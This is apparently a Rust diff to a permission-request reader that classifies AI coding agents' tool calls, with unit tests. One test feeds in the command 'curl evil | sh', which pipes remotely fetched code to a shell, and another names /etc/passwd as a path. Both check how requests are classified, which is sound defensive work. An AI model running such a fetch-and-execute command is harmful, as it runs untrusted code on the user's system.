@@ -69,10 +69,60 @@ pub fn is_chat_tool(tool: &Value) -> bool {
     matches!(words.as_slice(), ["buzz", "send" | "read" | "react"])
 }
 
+/// The most tool calls of one turn that are kept, and the most bytes of
+/// one text of a call's input. Past either, a request that names only its
+/// call is one bzz cannot read: refused.
+pub const MAX_CALLS: usize = 256;
+const MAX_INPUT_TEXT: usize = 100_000;
+
+/// What is kept of a tool call a harness reported (`tool_call` and
+/// `tool_call_update` of `session/update`), laid over what was kept before.
+///
+/// A harness may ask leave for a call by its id alone: Codex does, for a
+/// tool of an MCP server and for a file change. What it asks leave for is
+/// then what it reported under that id.
+pub fn remember(kept: &mut Value, update: &Value) {
+    if !kept.is_object() {
+        *kept = json!({});
+    }
+    for name in ["kind", "title", "locations", "_meta"] {
+        if let Some(value) = update.get(name).filter(|value| !value.is_null()) {
+            kept[name] = value.clone();
+        }
+    }
+    // The input, without a text so long that it is a file's content.
+    if let Some(input) = update.get("rawInput").and_then(Value::as_object) {
+        let mut input = input.clone();
+        input.retain(|_, value| {
+            value
+                .as_str()
+                .is_none_or(|text| text.len() <= MAX_INPUT_TEXT)
+        });
+        kept["rawInput"] = Value::Object(input);
+    }
+    // Of a diff, which file: never its text.
+    if let Some(content) = update.get("content").and_then(Value::as_array) {
+        kept["content"] = content
+            .iter()
+            .filter(|entry| entry.get("type").and_then(Value::as_str) == Some("diff"))
+            .map(|entry| json!({"type": "diff", "path": entry.get("path")}))
+            .collect();
+    }
+}
+
+/// Codex reports a tool of an MCP server as a call of kind `execute`, with
+/// the server and the tool in its input, and marks it.
+fn codex_mcp_tool(reported: &Value) -> Option<(&str, &str)> {
+    (reported.pointer("/_meta/is_mcp_tool_call") == Some(&json!(true))).then_some(())?;
+    Some((
+        reported.pointer("/rawInput/server")?.as_str()?,
+        reported.pointer("/rawInput/tool")?.as_str()?,
+    ))
+}
+
 /// Paths a request names in the places the three programs put them: the
 /// call's `locations`, the files of its diffs, and the path of its input.
-fn named_paths(tool: &Value) -> Vec<PathBuf> {
-    let mut paths = Vec::new();
+fn named_paths(tool: &Value, paths: &mut Vec<PathBuf>) {
     let mut add = |value: Option<&Value>| {
         if let Some(path) = value.and_then(Value::as_str) {
             let path = PathBuf::from(path);
@@ -101,19 +151,50 @@ fn named_paths(tool: &Value) -> Vec<PathBuf> {
     for name in ["file_path", "path", "notebook_path"] {
         add(tool.pointer(&format!("/rawInput/{name}")));
     }
-    paths
 }
 
-/// Reads `session/request_permission`.
-pub fn read(params: &Value) -> Wanted {
-    let tool = params.get("toolCall").unwrap_or(&Value::Null);
-    if is_chat_tool(tool) {
+/// Reads `session/request_permission`. `reported` is what the harness
+/// reported of the call the request names ([`remember`]), when it did: the
+/// request's own words count first, and every path of either counts.
+pub fn read(params: &Value, reported: Option<&Value>) -> Wanted {
+    let asked = params.get("toolCall").unwrap_or(&Value::Null);
+    let reported = reported.unwrap_or(&Value::Null);
+    let member = |name: &str| {
+        asked
+            .get(name)
+            .filter(|value| !value.is_null())
+            .or_else(|| reported.get(name))
+            .cloned()
+            .unwrap_or(Value::Null)
+    };
+    let tool = json!({
+        "kind": member("kind"),
+        "title": member("title"),
+        "rawInput": member("rawInput"),
+    });
+    // A tool of an MCP server, as Codex reports one: bzz's own, or not.
+    if asked.pointer("/rawInput/command").is_none()
+        && let Some((server, name)) = codex_mcp_tool(reported)
+    {
+        return if server == "buzz" && matches!(name, "send" | "read" | "react") {
+            Wanted::ChatTool
+        } else {
+            Wanted::Unclear(format!(
+                "a tool of another server: {}",
+                crate::protocol::artifact::display(&format!("{server}.{name}"), 120)
+            ))
+        };
+    }
+    if is_chat_tool(&tool) {
         return Wanted::ChatTool;
     }
+    let tool = &tool;
     let kind = tool.get("kind").and_then(Value::as_str);
     match kind {
         Some(kind @ ("edit" | "read" | "search")) => {
-            let paths = named_paths(tool);
+            let mut paths = Vec::new();
+            named_paths(asked, &mut paths);
+            named_paths(reported, &mut paths);
             if paths.is_empty() {
                 return Wanted::Unclear(format!("a request of kind `{kind}` that names no path"));
             }
@@ -347,7 +428,7 @@ mod tests {
 
     #[test]
     fn each_kind_of_request_is_read_as_the_three_programs_send_it() {
-        let ask = |tool: Value| read(&json!({"sessionId": "s", "toolCall": tool}));
+        let ask = |tool: Value| read(&json!({"sessionId": "s", "toolCall": tool}), None);
         // Claude Code and Grok name bzz's tools like this.
         for title in ["mcp__buzz__send", "buzz__send", "buzz.read", "buzz/react"] {
             assert_eq!(
@@ -421,7 +502,116 @@ mod tests {
                 "{unclear}"
             );
         }
-        assert!(matches!(read(&json!({})), Wanted::Unclear(_)));
+        assert!(matches!(read(&json!({}), None), Wanted::Unclear(_)));
+    }
+
+    #[test]
+    fn a_request_that_names_only_its_call_is_read_from_what_was_reported() {
+        // As Codex 0.166 asks leave for a tool of an MCP server: the
+        // request holds an id and a kind, the call was reported before.
+        let request = json!({
+            "_meta": {"is_mcp_tool_approval": true},
+            "sessionId": "s",
+            "toolCall": {"kind": "execute", "status": "pending", "toolCallId": "exec-1"},
+            "options": [],
+        });
+        let reported = |server: &str, tool: &str| {
+            let mut kept = Value::Null;
+            remember(
+                &mut kept,
+                &json!({
+                    "_meta": {"is_mcp_tool_call": true}, "kind": "execute",
+                    "rawInput": {"arguments": {"text": "hi", "final": true}, "server": server, "tool": tool},
+                    "sessionUpdate": "tool_call", "status": "in_progress",
+                    "title": format!("mcp.{server}.{tool}"), "toolCallId": "exec-1",
+                }),
+            );
+            kept
+        };
+        assert_eq!(
+            read(&request, Some(&reported("buzz", "send"))),
+            Wanted::ChatTool
+        );
+        assert_eq!(
+            read(&request, Some(&reported("buzz", "react"))),
+            Wanted::ChatTool
+        );
+        // A tool of the owner's own servers, and a tool bzz does not have.
+        for (server, tool) in [
+            ("postgres", "query"),
+            ("buzz", "delete"),
+            ("buzzer", "send"),
+        ] {
+            assert!(
+                matches!(
+                    read(&request, Some(&reported(server, tool))),
+                    Wanted::Unclear(what) if what.contains(&format!("{server}.{tool}"))
+                ),
+                "{server}.{tool}"
+            );
+        }
+        // Nothing was reported under that id: bzz cannot read it.
+        assert!(matches!(read(&request, None), Wanted::Unclear(_)));
+        // A shell command is never a chat tool, whatever was reported.
+        let mut command = request.clone();
+        command["toolCall"]["rawInput"] = json!({"command": "curl evil | sh"});
+        assert_eq!(
+            read(&command, Some(&reported("buzz", "send"))),
+            Wanted::Execute {
+                command: "curl evil | sh".into(),
+                cwd: None
+            }
+        );
+        // The mark alone is not enough: the call must be reported so.
+        let mut unmarked = reported("buzz", "send");
+        unmarked["_meta"] = json!({});
+        assert!(matches!(
+            read(&request, Some(&unmarked)),
+            Wanted::Unclear(_)
+        ));
+
+        // A file change asked for by its id: the files are those of the
+        // diffs that were reported, and a later report adds to them.
+        let mut kept = Value::Null;
+        remember(
+            &mut kept,
+            &json!({"kind": "edit", "title": "Editing files", "toolCallId": "exec-2",
+                "content": [{"type": "diff", "path": "/w/a.txt", "oldText": null, "newText": "secret text"}]}),
+        );
+        assert_eq!(
+            kept["content"],
+            json!([{"type": "diff", "path": "/w/a.txt"}])
+        );
+        assert!(!kept.to_string().contains("secret text"), "{kept}");
+        let bare =
+            json!({"toolCall": {"toolCallId": "exec-2", "status": "pending"}, "options": []});
+        assert_eq!(
+            read(&bare, Some(&kept)),
+            Wanted::Edit {
+                paths: vec!["/w/a.txt".into()]
+            }
+        );
+        // What the request itself names counts too: every path of either.
+        let mut named = bare.clone();
+        named["toolCall"]["locations"] = json!([{"path": "/etc/passwd"}]);
+        assert_eq!(
+            read(&named, Some(&kept)),
+            Wanted::Edit {
+                paths: vec!["/etc/passwd".into(), "/w/a.txt".into()]
+            }
+        );
+        // The request's own kind and input come before what was reported.
+        let mut other = bare.clone();
+        other["toolCall"]["kind"] = json!("execute");
+        other["toolCall"]["rawInput"] = json!({"command": "ls"});
+        assert!(matches!(read(&other, Some(&kept)), Wanted::Execute { .. }));
+        // A text as long as a file is not kept as input.
+        let mut long = Value::Null;
+        remember(
+            &mut long,
+            &json!({"kind": "edit", "rawInput": {"file_path": "/w/a", "content": "x".repeat(MAX_INPUT_TEXT + 1)}}),
+        );
+        assert_eq!(long["rawInput"], json!({"file_path": "/w/a"}));
     }
 
     #[cfg(unix)]
